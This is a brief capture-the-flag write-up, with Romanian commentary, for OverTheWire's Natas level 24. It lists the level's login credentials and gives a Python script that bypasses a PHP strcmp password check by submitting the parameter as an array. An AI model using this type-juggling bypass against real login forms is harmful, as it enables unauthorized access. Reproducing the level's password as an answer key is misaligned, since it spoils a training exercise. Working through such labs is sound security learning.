
# General info

Username: natas24
Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
URL:      http://natas24.natas.labs.overthewire.org

# Special code section

```py
import requests


response = requests.get(
    url="http://natas24.natas.labs.overthewire.org/index.php",
    auth=("natas24", "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd"),
    params={
        "passwd[]" : ""
    }
)

print(response.text)
```

Aici a trebuit sa dai submit la un `array` in loc de un `string` pentru ca PHP returneaza NULL cand faci `strcmp(array(), str)`.
Totusi, pe documentatie NU scrie asta, iar daca incerci, iti da FATAL ERROR, nu WARNING (asa cum se intampla aici).
A fost un challenge ciudat in care am incercat:
- un bruteforce cu caractere simple
- sa aflu versiunea de PHP (sa vad daca e vreun `strcmp` vulnerabil)
- sa incerc parola ca fiind `<censored>`
